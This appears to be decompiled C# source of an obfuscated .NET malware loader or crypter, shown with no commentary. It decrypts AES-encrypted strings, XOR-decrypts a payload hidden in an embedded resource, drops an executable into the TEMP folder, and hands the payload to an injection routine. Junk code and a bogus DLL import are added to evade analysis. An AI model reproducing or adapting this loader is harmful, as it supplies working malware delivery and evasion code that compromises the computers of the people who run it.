using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns1;

namespace ns0;

internal sealed class Class0
{
	public class Class1
	{
		[STAThread]
		public static void Main()
		{
			Class3 @class = new Class3();
			@class.method_0();
		}
	}

	public class Class3 : Class2
	{
	}

	public class Class2
	{
		[MethodImpl(MethodImplOptions.NoOptimization)]
		public void method_0()
		{
			int try0001_dispatch = -1;
			int num3 = default(int);
			int num2 = default(int);
			int num = default(int);
			byte[] array = default(byte[]);
			object obj = default(object);
			string text = default(string);
			bool flag = default(bool);
			string[] array2 = default(string[]);
			string path = default(string);
			ResourceManager resourceManager = default(ResourceManager);
			string text2 = default(string);
			string text3 = default(string);
			byte[] array3 = default(byte[]);
			string sourceFileName = default(string);
			string destFileName = default(string);
			byte[] byte_ = default(byte[]);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					int num4;
					string string_;
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0008;
					case 952:
						{
							num2 = num;
							if (smethod_0())
							{
								goto IL_01e2;
							}
							switch (14)
							{
							case 0:
							case 10:
								break;
							case 8:
								goto IL_003d;
							case 2:
							case 12:
								goto IL_0094;
							case 6:
								goto IL_00a2;
							case 7:
								goto IL_010e;
							case 9:
								goto IL_0115;
							default:
								goto IL_015f;
							case 11:
								goto IL_01e2;
							case 3:
								goto IL_01fc;
							case 1:
								goto IL_0247;
							case 4:
								goto IL_026f;
							case 13:
								goto end_IL_0001;
							case 14:
								goto IL_040f;
							}
							goto IL_0008;
						}
						IL_027c:
						num = 45;
						Class4.smethod_2(new object[6]
						{
							string.Empty,
							array,
							false,
							false,
							Assembly.GetExecutingAssembly().CodeBase!.Remove(0, 8),
							65
						});
						goto IL_02d2;
						IL_040f:
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001_2;
						}
						num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0025;
						case 4:
							goto IL_002d;
						case 5:
							goto IL_0035;
						case 6:
							goto IL_003d;
						case 7:
							goto IL_0045;
						case 8:
							goto IL_004d;
						case 9:
							goto IL_006e;
						case 10:
							goto IL_0091;
						case 11:
							goto IL_0097;
						case 12:
							goto IL_00fb;
						case 13:
						case 14:
							goto IL_0101;
						case 15:
							goto IL_010b;
						case 16:
							goto IL_0115;
						case 17:
						case 18:
							goto IL_0118;
						case 19:
							goto IL_012c;
						case 20:
							goto IL_0149;
						case 21:
						case 22:
							goto IL_015c;
						case 23:
							goto IL_0175;
						case 24:
							goto IL_017c;
						case 25:
							goto IL_018c;
						case 27:
							goto IL_0193;
						case 28:
							goto IL_0196;
						case 30:
							goto IL_01af;
						case 26:
						case 29:
						case 31:
						case 32:
						case 33:
							goto IL_01b2;
						case 34:
							goto IL_01df;
						case 35:
							goto IL_01e2;
						case 36:
							goto IL_01e5;
						case 37:
							goto IL_01fc;
						case 38:
							goto IL_0212;
						case 39:
							goto IL_0228;
						case 40:
							goto IL_0236;
						case 41:
							goto IL_0244;
						case 42:
							goto IL_0247;
						case 43:
							goto IL_025e;
						case 44:
							goto IL_026f;
						case 45:
							goto IL_027c;
						case 46:
							goto IL_02d2;
						default:
							goto end_IL_0001_2;
						case 47:
							goto end_IL_0001_3;
						}
						goto default;
						IL_02d2:
						num = 46;
						break;
						IL_0008:
						num = 2;
						obj = "" + Assembly.GetEntryAssembly()!.Location + "";
						goto IL_0025;
						IL_0025:
						num = 3;
						goto IL_002d;
						IL_002d:
						num = 4;
						goto IL_0035;
						IL_0035:
						num = 5;
						goto IL_003d;
						IL_003d:
						num = 6;
						goto IL_0045;
						IL_0045:
						num = 7;
						goto IL_004d;
						IL_004d:
						num = 8;
						_ = Interaction.Environ(smethod_2("Ls2zSNWRb537B/rVgoI6kQ==")) + smethod_2("H938oXuJqBbV+qs3JjUgXSjrC6i7MpCE6XYe/o4I5iE=");
						goto IL_006e;
						IL_006e:
						num = 9;
						text = Interaction.Environ(smethod_2("Ls2zSNWRb537B/rVgoI6kQ==")) + smethod_2("6kNwQdHzsDOZL9M/oqHsVS/2cdmfFAUGoneb4zAda9g=");
						goto IL_0091;
						IL_0091:
						num = 10;
						goto IL_0094;
						IL_0094:
						flag = false;
						goto IL_0097;
						IL_0097:
						num = 11;
						array2 = new string[5];
						goto IL_00a2;
						IL_00a2:
						array2[0] = text;
						array2[1] = smethod_2("#thenwfol#");
						array2[2] = "\\";
						array2[3] = smethod_2("#rundl343l32.exe#");
						array2[4] = "";
						if (Operators.ConditionalCompareObjectEqual((object)string.Concat(array2), Operators.ConcatenateObject(Operators.ConcatenateObject(obj, (object)""), (object)""), false))
						{
							goto IL_00fb;
						}
						goto IL_0101;
						IL_00fb:
						num = 12;
						flag = true;
						goto IL_0101;
						IL_0101:
						num = 14;
						path = "hate07FindMe";
						goto IL_010b;
						IL_010b:
						num = 15;
						goto IL_010e;
						IL_010e:
						File.Delete(path);
						goto IL_0115;
						IL_0115:
						num = 16;
						goto IL_0118;
						IL_0118:
						num = 18;
						resourceManager = new ResourceManager("会会海", Assembly.GetExecutingAssembly());
						goto IL_012c;
						IL_012c:
						num = 19;
						text2 = "" + Interaction.Environ("TEMP") + "";
						goto IL_0149;
						IL_0149:
						num = 20;
						Class0.smethod_0(smethod_2("fryHzRzQEcJMeCqYs/9cyg=="));
						goto IL_015c;
						IL_015c:
						num = 22;
						goto IL_015f;
						IL_015f:
						text3 = smethod_2("6M53+dlHIkI9o0qsI9ORWQ==") + ".exe";
						goto IL_0175;
						IL_0175:
						num = 23;
						array3 = array3;
						goto IL_017c;
						IL_017c:
						num = 24;
						smethod_1(array3, "fsfsdfsdfsdfsdf");
						goto IL_018c;
						IL_018c:
						num = 25;
						if (!flag)
						{
							goto IL_0193;
						}
						goto IL_01b2;
						IL_0193:
						num = 27;
						goto IL_0196;
						IL_0196:
						num = 28;
						if (!Operators.ConditionalCompareObjectEqual(obj, (object)(text + "#nsgdfgdsp#$$$.exe$$$"), false))
						{
							goto IL_01af;
						}
						goto IL_01b2;
						IL_01af:
						num = 30;
						goto IL_01b2;
						IL_01b2:
						num = 33;
						sourceFileName = Interaction.Environ(smethod_2("kjdK7iQ8dBBB3CNlxicz4A==")) + smethod_2("F0ncs30O8obaTOBS0SfSoxgc8RA0aJ06fXLY20pbeoapgk91MHORB2PJA21CpQpD") + smethod_2("9ekM/72Oo3jhOtrhgQJW9g==");
						goto IL_01df;
						IL_01df:
						num = 34;
						goto IL_01e2;
						IL_01e2:
						num = 35;
						goto IL_01e5;
						IL_01e5:
						num = 36;
						destFileName = "" + text2 + "\\" + text3;
						goto IL_01fc;
						IL_01fc:
						num = 37;
						byte_ = (byte[])resourceManager.GetObject("九毒家");
						goto IL_0212;
						IL_0212:
						num = 38;
						array = smethod_1(byte_, smethod_2("Di0jFz0G0VdSujQJAQfd1V6r37HuqAvIMYPVVgrp9Kc="));
						goto IL_0228;
						IL_0228:
						num = 39;
						new StringBuilder("");
						goto IL_0236;
						IL_0236:
						num = 40;
						"ABCDEFGHIdefghijklmnopqrstuvwxyz".ToCharArray();
						goto IL_0244;
						IL_0244:
						num = 41;
						goto IL_0247;
						IL_0247:
						num = 42;
						string_ = "ddddddddd";
						DhcpDeRegisterParamChange(1225, ref string_);
						goto IL_025e;
						IL_025e:
						num = 43;
						File.Delete(text + text3);
						goto IL_026f;
						IL_026f:
						num = 44;
						File.Copy(sourceFileName, destFileName, overwrite: true);
						goto IL_027c;
						end_IL_0001:
						break;
					}
					Thread.Sleep(10000);
					ProjectData.EndApp();
					break;
					end_IL_0001_2:;
				}
				catch (object obj2) when (obj2 is Exception && num3 != 0 && num2 == 0)
				{
					ProjectData.SetProjectError((Exception)obj2);
					try0001_dispatch = 952;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0001_3:
				break;
			}
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		internal static bool smethod_0()
		{
			return false;
		}
	}

	[DllImport("ssssssssss", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long DhcpDeRegisterParamChange(int int_0, [MarshalAs(UnmanagedType.AnsiBStr)] ref string string_0);

	public static bool smethod_0(string string_0)
	{
		Process[] processesByName = Process.GetProcessesByName(string_0);
		if (processesByName.Length > 0)
		{
			return true;
		}
		return false;
	}

	public static byte[] smethod_1(byte[] byte_0, string string_0)
	{
		checked
		{
			byte[] array = new byte[byte_0.Length + 1];
			Conversion.Int((object)false);
			int num = byte_0[byte_0.Length - 1] ^ 0x70;
			byte[] bytes = Encoding.Default.GetBytes(string_0);
			Conversion.Int((object)false);
			Conversion.Int((object)false);
			int num2 = byte_0.Length - 1;
			int num3 = default(int);
			for (int i = 0; i <= num2; i++)
			{
				array[i] = (byte)(byte_0[i] ^ num ^ bytes[num3]);
				num3 = ((num3 != string_0.Length - 1) ? (num3 + 1) : 0);
			}
			Conversion.Int((object)false);
			array = (byte[])Utils.CopyArray((Array)array, (Array)new byte[byte_0.Length - 2 + 1]);
			Conversion.Int((object)false);
			return array;
		}
	}

	public static string smethod_2(string string_0)
	{
		string s = "日好老您";
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = "";
		string result = default(string);
		try
		{
			byte[] array = new byte[32];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(s));
			Array.Copy(sourceArray, 0, array, 0, 10);
			Array.Copy(sourceArray, 0, array, 15, 10);
			rijndaelManaged.Key = array;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array2 = Convert.FromBase64String(string_0);
			text = Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
			result = text;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
